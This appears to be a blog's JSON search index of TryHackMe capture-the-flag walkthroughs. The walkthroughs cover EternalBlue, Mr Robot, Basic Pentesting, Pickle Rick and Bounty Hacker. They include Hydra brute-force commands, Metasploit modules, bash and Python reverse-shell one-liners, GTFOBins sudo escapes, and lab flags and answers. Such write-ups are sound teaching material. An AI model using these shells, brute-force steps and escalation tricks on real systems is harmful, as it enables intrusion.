[
  
  {
    "title": "Eternal Blue - TryHackMe",
    "url": "/posts/vulnversity/",
    "categories": "Blogging, TryHackme",
    "tags": "walkthrough",
    "date": "2022-10-02 02:43:12 +0000",
    





    "snippet": "Recon"
  },
  
  {
    "title": "Eternal Blue - TryHackMe",
    "url": "/posts/EternalBlue/",
    "categories": "Blogging, TryHackme",
    "tags": "walkthrough",
    "date": "2022-10-02 02:43:12 +0000",
    





    "snippet": "IntroductionEternalBlue is a computer exploit developed by the U.S. National Security Agency. It was leaked by the Shadow Brokers hacker group on April 14, 2017, one month after Microsoft released patches for the vulnerability. On May 12, 2017, the worldwide WannaCry ransomware used this exploit to attack unpatched computers.In this article I am going to show you how to exploit a very popular Microsoft Windows Vulnerability to gain system access and escalate privileges.Before reading this article, I urge you folks to try it out first!!ReconScan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused. —TryhackmeIn this phase, our main aim is to gather information about our target as much as possible. We can achieve that by using Nmap to gather information on Open ports and Closed ports. Soo without wasting time I started by scaning my target.$ nmap -sV -p- -vv -Pn -oN nmap 10.10.140.222Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-27 20:17 EATNSE: Loaded 45 scripts for scanning.Initiating Parallel DNS resolution of 1 host. at 20:17Completed Parallel DNS resolution of 1 host. at 20:17, 0.07s elapsedInitiating Connect Scan at 20:17Scanning 10.10.140.222 [65535 ports]Discovered open port 445/tcp on 10.10.140.222Discovered open port 135/tcp on 10.10.140.222Discovered open port 3389/tcp on 10.10.140.222Discovered open port 139/tcp on 10.10.140.222Now that from the result of the scan, I was able to answer Task 1 .Host ScanI found 3 ports under 1000.Answer 3 ports under 1000It’s Vulnerable with ‘SMBv1 server ms17-010’.Answer ms17-010Gain AccessNow that from the scan we have seen that this machine is vulnerable to ms17-010 Remote code execution vulnerability. I used Metasploit to exploit it.You need to start Metasploit using the following command:$ msfconsole Now we need try to find the exploitation against ‘SMBv1 server ms17-010’. By using “search ms17-010” command.I used the first exploit as shown in the above picture.Answer exploit/windows/smb/ms17_010_eternalblueEach exploit needs a certain options(parameters) to be set.To view the options the command is:$ show optionsNow we need to set the options which are required and not already set.To know which options are required we need to see the “Required” column for a stating yes.Metasploit required optionsAnswer RHOSTSset RHOSTS &lt;machine_ip&gt;After setting the required options we can now run the exploit.But here I my exploit was not successful after several trials but I realized I was listening with Wlan0 meanwhile I was using THM VPN to access the target. So I had to change my LHOST from wlan0 to tun0.If everything goes well, you will recieve a WIN flag that means the exploit was successfully on the machine and the session was created.EscalateNT AUTHORITY\\SYSTEM means you are the most powerful user on that system.It also means that you are the root user.\"The account NT AUTHORITY\\System which is a Local System account.. It is a powerful account that has unrestricted access to all local system resources. It is a member of the Windows Administrators group on the local computer, and is therefore a member of the SQL Server sysadmin fixed server role.”–MICROSOFTAnswer post/multi/manage/shell_to_meterpreterAnswer SESSIONCrackingThe passwords in the Windows are stored in Hash format.Hashing is technique to convert plain text passwords to non-human readable format which are difficult to crack.Hashdump is command to retrieve the passwords stored in the SAM(Security Account Manager) database where windows stores it user passswords.Using this you get to know the passwords of the different users on the machine.Windows uses NTLM(New Technique Network Manager) type of hashing method to store its password.HashcatHashcat is a password cracking tool used for licit and illicit purposes. Hashat is a particularly fast, efficient, and versatile hacking tool that assists brute-force attacks by conducting them with hash values of passwords that the tool is guessing or applying.After doing the hashdump in metasploit, we found the encoded password and salt for the password.So I decided to use Hashcat which was very fast in cracking that hash.CrackstationCrackStation is a security awareness project started by Defuse Security. Its purpose is to raise awareness about insecure password storage in web applications, and to provide guidance to implementors of user authentication systems.Crackstation is a free service that supports MD2, MD5, NTLM, and SHA1 cracking.Answer: alqfna22Finding FlagsI achieved locating the flags by using the following command:$ search -f flag*.txtFlag 1Flag 2Flag 3Finally!!!I hope you enjoyed reading through this article. Please follow me on Github"
  },
  
  {
    "title": "Mr Robot CTF - TryHackMe",
    "url": "/posts/MrRobot/",
    "categories": "Blogging, TryHackme",
    "tags": "walkthrough",
    "date": "2022-09-20 03:30:42 +0000",
    





    "snippet": "This is a Mr Robot themed CTF originally taken from Vulnhub.Here We Bruteforce Wordpress login pannel to find a valid user and Bruteforce again to find a valid password.Once we are in, we upload a php shell on Wordpress Theme to get a reverse shell and privilege escalate using Suid and Nmap.Elliot (movie star)ReconNmap$ nmap -p- -sV -vv -Pn 10.10.189.156Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-25 15:59 EATNSE: Loaded 45 scripts for scanning.Initiating Parallel DNS resolution of 1 host. at 15:59Completed Parallel DNS resolution of 1 host. at 15:59, 0.47s elapsedInitiating Connect Scan at 15:59Scanning 10.10.189.156 [65535 ports]Discovered open port 80/tcp on 10.10.189.156Discovered open port 443/tcp on 10.10.189.156From the scan it seems like we have only two open ports.  Port 80 (HTTP)  Port 443 (HTTPS)Port 80After performing a hidden directory scan on port 80, I noticed like there was a Wordpress site.From the second scan I found /robots.txtI found two files:  fsocity.dic  key-1-of-3.txtIn key-1-of-3.txt, I found my first flag.The other file seemed to prompt me to download some weird file.After opening the file fsocity.dic I found it was a dictionary. I knew something interesting was on the way.With dictionary you can perform a password attack to do some logins.Let’s continue to the Interesting part of my life lol!There was a wordpress site running, I found this /wp-login.php page.Since there is no brute force prevention method implemented on the login page of the CMS, it is easy to brute-force the password of the account. First, I sorted the wordlist and removed duplicates using sort  fsocity.dic | uniq &gt; fsocity.dic.uniq and then tried to guess the username of the account.In order to use Hydra we need to have the following variables:$ hydra -L fsocity.dic.uniq -p nopass \\-s 80 10.10.187.177 http-post-form -t 30 \\'/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:Invalid username' Since the website is responding very late, cluster bombing with the combination of password and username would take forever. However, you will see the valid username is Elliot. Now try to brute force the password of the user Elliot using the following command.$ hydra -l Elliot -P fsocity.dic.uniq \\-s 80 10.10.187.177 http-post-form -t 30 \\'/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:The password you entered for the username'Now with this credentials I tried to login into the wordpress site.You will see the password is ER28-0652. So the login credentials of the WordPress account we found so far is Elliot:ER28-0652Login was Successful.Gain AccessMethod 1: Using Wordpress ThemeAfter Logging to the wordpress site, I started by exploring the appearance tab.Now Went to the Tweenty fifteen and chose 404.php template.Now, to proceed further, I used the reverse shell of PHP (By Penetstmonkey). And then I copied the above php-reverse-shell and paste it into the 404.php wordpress template as shown in the picture below. I have altered the IP address to my present IP address and entered any port you want and started the netcat listener to get the reverse connection.Update the file and browse the following URL to run the injected php code.http://10.10.8.138/wordpress/wp-content/themes/twentyfifteen/404.phpMeanwhile When I was executing my 404.php, I had my Pwncat -cs  listening for any connection. Method 2: Upload Vulnerable WP_PluginSome time logon users do not own writable authorization to make modifications to the WordPress theme, so I choose “Inject WP pulgin malicious” as an alternative strategy to acquiring a web shell.So, once you have access to a WordPress dashboard, you can attempt installing a malicious plugin. Here I’ve already downloaded the vulnerable plugin from exploit db.Now you need to download the Vulnerable app from the exploit DB and do not Unzip it since the worpress will only accept a zipped plugin to be uploaded.Click here to download the plugin.Since I have zip file for plugin and now it’s time to upload the plugin.Dashboard &gt; plugins &gt; upload pluginFirst It will prompt you to add the plugin manually and that is what we exactly want.When everything is well setup then go for exploiting. Since we have installed vulnerable plugin named “reflex-gallery” and it is easily exploitable.You will get exploit for this vulnerability inside Metasploit framework and thus load the below module and execute the following command:$ use exploit/unix/webapp/wp_slideshowgallery_upload$ set rhosts 192.168.1.101$ set targeturi /wordpress$ exploitAs the above commands are executed, you will have your meterpreter session.Method 3: Inject Malicious PluginAs you have seen in the above method, I have uploaded the vulnerable plugin whose exploit is available. Lol! there is a shortcut for that,You can do that by generating your own malicious plugin.exec(\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/{IP}/{PORT} 0&gt;&amp;1'\")$ cat revshell.phpexec(\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/{IP}/{PORT} 0&gt;&amp;1'\")Copy this code and save it in a file revshell.php and compress the file in zip format.Again, repeat the same step as done above for uploading plugin “revshell.zip” file and start netcat listener to obtain the reverse connection of the target machine.When I activated the theme I received the reverse connection to the target machine.Eazzy Peaazyy! Right?Previlege EscalationBy this time I was the daemon group. The daemon User ID/Group ID was used as an unprivileged User ID/Group ID for daemons to execute under in order to limit their access to the system. Generally daemons should now run under individual User ID/Group IDs in order to further partition daemons from one another.It’s time to escalate to root…After checking for SUID misconfigurations, I can see Nmap is located on the system and is owned by the root user. This means no matter what your UserID is the effective user id of the program would be 0 or root.GTFOBINSGTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.From the Picture above from GTFOBINS, I found instructions on how escalate to root using this particular misconfig.$ /usr/local/bin/nmap --interactive$ nmap&gt; !shBy following the simple instruction, I was already in the root group.Machine PwnedSummary  First I started with  nmap where I found two open ports:           port 80       Port 443        I started by exploiting port 80, where I found a wordpress running on this machine.  In the robots.txt directory I found two files:          fsocity.dic      key-1-of-3.txt        I found a wordpress login page .  I tried to guess the password using the fsocity.dic.  Using Hydra, I found that:          Username: Elliot      Password: ER28-0652        I was redirected to wp-dashboard  In the article I demonstrated 3 ways to gain access of the target’s machine:          Using wordpress theme      Upload vulnerable wp-plugin      Injection malicious plugin        With the above methods, you’ll have gained the access of the machine.  The next step was to escalate privelege from daemon to root  This could only be achieved by running the command: find / -type f -perm -4000 2&gt;/dev/null  You will find out that nmap was misconfigured.  Heading to GTFOBINS and following the instructions given, you will have escalated to root  Machine PwnedIt was an interesting room. I hope you enjoyed reading through the article."
  },
  
  {
    "title": "Basic Pentesting - TryHackMe",
    "url": "/posts/BasicPentesting/",
    "categories": "Blogging, TryHackme",
    "tags": "walkthrough",
    "date": "2022-09-08 02:38:14 +0000",
    





    "snippet": "In these set of tasks you’ll learn the following: brute forcing, hash cracking, service enumeration and Linux Enumeration. The main goal here is to learn as much as possible.Room DescriptionReconNmapLet’s start by gathering as information as possible. I always love using Nmap to scan our target. Nmap ScanPort 80 seems promising, Let’s start with it.Port 80Port 80 is the port number assigned to commonly used internet communication protocol, Hypertext Transfer Protocol (HTTP). It is the default network port used to send and receive unencrypted web pages.When a client attempts to connect to a server and make a request, it needs to know both the server’s IP address and which network service will be used to transfer data. To make it convenient for programmers, most popular network services are assigned “well-known” port numbers by default.lol! I guess I was wrong, port 80 had nothing helpful at all.WebServer on port 80Let’s try port 8080Port 8080I found Apache Tomcat/9.0.7 was running on this port.Apache Tomcat/9.0.7The next step is to perform a Gobuster scan on this particular url.After scanning for hidden directories I found something interesting i.e /DevelopmentGobuster ScanAfter visiting /Development directory, I found that there was 2 files:  dev.txt  j.txt/Development directoryYes! I did visit the two files2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neatto host that on this server too. Haven't made any real web apps yet, but I have tried that exampleyou get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm using version 2.5.12, because other versions were giving me trouble. -K2018-04-22: SMB has been configured. -K2018-04-21: I got Apache set up. Will put in our content later. -JFor J:I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,and I was able to crack your hash really easily. You know our password policy, so please followit? Change that password ASAP.-KPort 445TCP port 445 is used for direct TCP/IP MS Networking access without the need for a NetBIOS layer. The SMB (Server Message Block) protocol is used for file sharing in Windows NT/2K/XP and later. Using this port you can get to know the users in the target machine. So I did exploit this port.$ enum4linux -a 10.10.119.26 |tee enum4linux.log Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Sep 20 20:41:20 2022 ========================== |    Target Information    | ========================== Target ........... 10.10.119.26RID Range ........ 500-550,1000-1050Username ......... ''Password ......... ''Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ==================================================== |    Enumerating Workgroup/Domain on 10.10.119.26    | ==================================================== [+] Got domain/workgroup name: WORKGROUP ============================================ |    Nbtstat Information for 10.10.119.26    | ============================================ Looking up status of 10.10.119.26\tBASIC2          &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service\tBASIC2          &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service\tBASIC2          &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service\t..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser\tWORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name\tWORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser\tWORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections\tMAC Address = 00-00-00-00-00-00 ===================================== |    Session Check on 10.10.119.26    | ===================================== [+] Server 10.10.119.26 allows sessions using username '', password ''Now here you need to analyse the whole information and gather the helpful info.I found two users:  /user/jan  /user/kayUsersPassword AttackNow that I have the usernames in the target’s machine, and remember port 22 was open. I thought of brute forcing the SSH service using Hydra. Warning: Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Lol! ignore that scary warning Okay!! time to work!!Hydra needs some patience… lol! I almost lost mine …$ sudo hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.61.114 [sudo] password for nesh: Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-20 21:25:00[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task[DATA] attacking ssh://10.10.61.114:22/[STATUS] 104.00 tries/min, 104 tries in 00:01h, 14344299 to do in 2298:46h, 16 active[STATUS] 100.00 tries/min, 300 tries in 00:03h, 14344103 to do in 2390:42h, 16 active[STATUS] 97.14 tries/min, 680 tries in 00:07h, 14343723 to do in 2460:56h, 16 active[22][ssh] host: 10.10.61.114   login: jan   password: armando1 of 1 target successfully completed, 1 valid password foundHydra Brute ForceNow that from the scan I found password for the user jan is armando.With this credidentials I found out that I could gain access to this machine using port 22 (ssh).Gain AccessPort 22By default, port 22 is open on all IBM StoredIQ hosts. The port is used for Secure Shell (SSH) communication and allows remote administration access to the VM. In general, traffic is encrypted using password authentication.$ ssh jan@10.10.61.114 The authenticity of host '10.10.61.114 (10.10.61.114)' can't be established.ECDSA key fingerprint is SHA256:+Fk53V/LB+2pn4OPL7GN/DuVHVvO0lT9N4W5ifchySQ.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.61.114' (ECDSA) to the list of known hosts.jan@10.10.61.114's password: Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage0 packages can be updated.0 updates are security updates.Gain AccessPriviledge EscalationI realized that user jan can’t run sudo command. I had to escalate my priviledges to root.So I uploaded a linpeas script on the /tmp directory.linPEAS is a well-known enumeration script that searches for possible paths to escalate privileges on Linux/Unix* targets.According to linpeas it seemed the machine was Vulnerable to CVE-2021-4034.After doing a research on this CVE. A local privilege escalation vulnerability was found on polkit’s pkexec utility. The pkexec application is a setuid tool designed to allow unprivileged users to run commands as privileged users according predefined policies. The current version of pkexec doesn’t handle the calling parameters count correctly and ends trying to execute environment variables as commands. An attacker can leverage this by crafting environment variables in such a way it’ll induce pkexec to execute arbitrary code. When successfully executed the attack can cause a local privilege escalation given unprivileged users administrative rights on the target machine.Vulnerable to CVE-2021-4031After some research I found two possible exploits on this CVE:  CVE-2021-4034.py  CVE-2021-4034.cThe machine had python3 installed. So I decided to use CVE-2021-4034.pyI uploaded the script on my web server in my local machine then uploaded it to the target’s /tmp directory using the wget command.Local Machine WebserverAfter running the python script, I escalated my privilegdes all the way to root. But when you run the python script you will realize that you will get a /bin/dash shell and by this you need to upload that shell to /bin/bash shell.You can do that by running the following commands:$ python3 -c \"import pty;pty.spawn('/bin/bash')\"$ export TERM=xtermMachine PwnedSummary  First I started by performing a port scan on the target’s machine using Nmap  From the Nmap scan I found 6 open ports:          22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)      80/tcp   open  http        syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))      139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)      445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)      8009/tcp open  ajp13       syn-ack ttl 63 Apache Jserv (Protocol v1.3)      8080/tcp open  http        syn-ack ttl 63 Apache Tomcat 9.0.7        On port 8080 I found Apache Tomcat 9.0.7 server.  After scanning  for hidden directories using Gobuster I found /development  In this directory I found 2 files:          dev.txt      j.txt        From this file there was a hint that I should try port 445  In this port I scanned for users in this machine using enum4linux tool.  As a result I found two users:          /user/jan      /user/kay        So far so good, with info I decided to perform a password attack using a tool known as hydra and password dictionary that comes pre-installed in the machine in this path: /usr/share/wordlists/dirbuster/directory-2.3-medium.txt.  For User jan I found that the password was armando.  Using this info I gained the access by using the credentials to login to ssh service  And by this simple ways I had gained the access.  Easy peazzy! Right?  Time to escalate priviledges to root.  I uploaded linpeas script in the target’s machine, which I made it executable by using the following command:    $ chmod +x linpeas.sh$ ./linpeas.sh        After running the script i found that the machine was vulnerable to CVE-2021-4034  After doing some research I found Python script, which I uploaded to the target machine on the /tmp directory  After running the python script, Boom! machine pwnedIt was indeed a lot of fun. I hope you find this article educative. I hope you enjoyed reading through it."
  },
  
  {
    "title": "Pickle Rick - TryHackMe",
    "url": "/posts/PickleRick/",
    "categories": "Blogging, TryHackme",
    "tags": "writeup",
    "date": "2022-09-05 11:42:24 +0000",
    





    "snippet": "This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.Room DescriptionReconNmapFirst I started off by conducting an Nmap scan on the target.$ nmap -sV -p- -vv -oN nmap 10.10.43.157 $ nmap -sV -p- -vv -oN nmap 10.10.43.157Initiating Connect Scan at 21:51Scanning 10.10.43.157 [65535 ports]Discovered open port 22/tcp on 10.10.43.157Discovered open port 80/tcp on 10.10.43.157Nmap ScanLet’s check port 80Port 80port 80There is nothing interesting here let’s try to check the Source Code.When you inspect the code you will see something very interesting, Saw a comment:$ curl 10.10.73.218 ...  &lt;!--    Note to self, remember username!    Username: R1ckRul3s  --&gt;&lt;/body&gt;&lt;/html&gt;source code inspectionNow we have a Username: R1ckRul3sLet’s check for more.Gobuster ScanRobots.txt DirectoryFound something in this directory: Wubbalubbadubdub. This might help us somewhere.   Let’s continue to gather more info about the target.I did another directory scan with gobuster and found other hidden directories.$ gobuster dir -u http://10.10.208.247/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,css,txt,js,sh===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://10.10.208.247/[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.1.0[+] Extensions:              sh,php,css,txt,js[+] Timeout:                 10s===============================================================2022/09/08 12:07:07 Starting gobuster in directory enumeration mode===============================================================/login.php            (Status: 200) [Size: 882]/assets               (Status: 301) [Size: 315] [--&gt; http://10.10.208.247/assets/]/portal.php           (Status: 302) [Size: 0] [--&gt; /login.php]                    Progress: 2760 / 1323366 (0.21%) On the /login.php I found a login page.Login PortalLet’s try to use:Username: R1ckRul3s Password: WubbalubbadubdubAfter a successful login, I found a Web shell.Web ShellI thought of uploading a reverse payload from Pentest Monkey and listen using pwncat.python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.8.238.145\",2001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'Gain AccessAfter uploading the payload I received a reverse connection.Gained Access(local) pwncat$                                                                                                                                    (remote) www-data@ip-10-10-252-65:/var/www/html$ lsSup3rS3cretPickl3Ingred.txt  assets  clue.txt  denied.php  index.html  login.php  portal.php  robots.txt(remote) www-data@ip-10-10-252-65:/var/www/html$ cat Sup3rS3cretPickl3Ingred.txtmr. meeseek hairFound the first flag:  mr. meeseek hairPriviledge EscalationI realised www-data could run sudo command without password.Machine PwnedSummary  From Nmap results, we found that we have 2 open ports:          Port 22 (ssh)      Port 80 (http)        From Gobuster scan we found a bunch of directories but only two were helpful the others were rabbit holes. The two directories are:          /robots.txt      /portal.php        On the Portal directory we used R1ckRul3s as the username and Wubbalubbadubdub as the password.  We uploaded a payload from Pentest Monkey on the web shell.  Received a reverse connection to the machine.  I realised that the user www-data could run sudo command without password.  I used Sudo su to escalate my priviledges to root.That Machine was easy-peasy. It was fun doing the machine. I hope you enjoyed reading through it."
  },
  
  {
    "title": "Bounty Hacker - TryHackMe",
    "url": "/posts/BountyHacker/",
    "categories": "Blogging, TryHackme",
    "tags": "walkthrough",
    "date": "2022-09-04 06:42:24 +0000",
    





    "snippet": "You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!Bounty Hacker is a room in TryHackMe. In this article you will learn how to exploit the sudo misconfiguration when there is a password reusable vulnerability in the target machine.Room DescriptionLet’s do this…NmapFirst of all I love to start by conducting an Nmap scan on the target.$ nmap -sV -p- -vv -oN nmap {Target_IP}Initiating Connect Scan at 15:13Scanning 10.10.181.69 [65535 ports]Discovered open port 80/tcp on 10.10.181.69Discovered open port 21/tcp on 10.10.181.69Discovered open port 22/tcp on 10.10.181.69Port 80First Let’s start with port 80.Port 80Went through the source code and nothing was interesting. Port 21File Transfer Protocal Service runs on port 21. The File Transfer Protocol provides a framework to transfer information between two networked computers, much like Hypertext Transfer Protocol does through a web browser.I tried to login to this port anonymously and it was successful.ftp 10.10.195.119Connected to 10.10.195.119.220 (vsFTPd 3.0.3)Name (10.10.149.154:nesh): anonymous230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp Service on port 21I downloaded all the files from this port using the Mget * command.The two texts files were:Locks.txtandtask.txt$ cat task.txt1.) Protect Vicious.2.) Plan for Red Eye pickup on the moon.-linFrom the task.txt we gather that we have a user whose name is lin Username: linOn the other hand the other file seemed to be a password container. With this file, we could perform a password dictionary attack using a tool known as Hydra.Performing the attack on Port 22Port 22The options we pass into Hydra depends on which service (protocol) we’re attacking. For example if we wanted to bruteforce SSH with the username being user and a password list being locks.txt, we’d use the following command:hydra -l lin -P /home/nesh/tryhackme/BountyHacker 10.10.195.119  -t 4 sshHydra Password attackHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-04 21:23:38[DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries (l:1/p:26), ~7 tries per task[DATA] attacking ssh://10.10.149.154:22/[22][ssh] host: 10.10.149.154   login: lin   password: RedDr4gonSynd1cat31 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-04 21:23:49Username: lin Password: RedDr4gonSynd1cat3Now that we have the needed credentials to ssh to the machine, Let’s do it …$ ssh lin@10.10.149.154SSH Login on port 22Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14lin@bountyhacker:~/Desktop$ lsuser.txtlin@bountyhacker:~/Desktop$ cat user.txt THM{CR1M3_SyNd1C4T3}lin@bountyhacker:~/Desktop$ Priviledge EscalationThere are two ways to escalate priviledges to root:Method 1 : Using Linpeas ScriptFor PrevEsc I love running linpeas script. To scan for vulnerabilities in the target system. I uploaded the linpeas script to my port 80, so that I can go on the target machine to /tmp directory and run the script.Local hostI need to go to the /tmp to download the script to the script.Linpeas ScriptIt’s time to run the script …$ ./linpeas.shLinpeas ScriptFound the target was vulnerable to CVE-2020-4034.CVE-2020-4034A local privilege escalation vulnerability was found on polkit’s pkexec utility. The pkexec application is a setuid tool designed to allow unprivileged users to run commands as privileged users according predefined policies. The current version of pkexec doesn’t handle the calling parameters count correctly and ends trying to execute environment variables as commands. An attacker can leverage this by crafting environment variables in such a way it’ll induce pkexec to execute arbitrary code. When successfully executed the attack can cause a local privilege escalation given unprivileged users administrative rights on the target machine.There are two versions of the CVE exploit: Python3 Exploit C language exploitI uploaded the CVE exploit to my port 80 and went to the target machine and downloaded it there.After running the script I was in root group. And collected the root flag root.txtTHM{80UN7Y_h4cK3r}Machine Pwnedmethod 2: Using GTFOBINsGTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.lin@bountyhacker:/tmp$ sudo -l[sudo] password for lin: Matching Defaults entries for lin on bountyhacker:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser lin may run the following commands on bountyhacker:    (root) /bin/tarUsing the command $ sudo -l , we see that the user lin can run the /bin/tar command with root priviledges.Let’s see what GTFOBINS has for us …Now let’s run the command on our target..sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/shMachine PwnedThere is need upgrade the shell$ python3 -c \"import pty;pty.spawn('/bin/bash')\"And collected the root flag:$ cat /root/root.txtTHM{80UN7Y_h4cK3r}Summary  From the Nmap scan, we found 3 open ports i.e          Port 21 (ftp)      Port 22 (ssh)      Port 80 (http)        Port 22 allowed anonymous login. After the succesful login I found 2 files on the ftp server. locks.txt, note.txt. After I opened note.txt I found Username lin and on the other file I found some password stored iin the file.  I used locks.txt as my dictionary to Bruteforce the ssh login using a tool known as hydra.  I found lin's password and used that to login to the machine using ssh.  I found that I could escalate my previledges using 2 methods:          Linpeas script      GTFOBINS Github        With this 2 methods I Pwned the machineIt was indeed a lot of fun. I hope you enjoyed reading through it."
  }
  
]

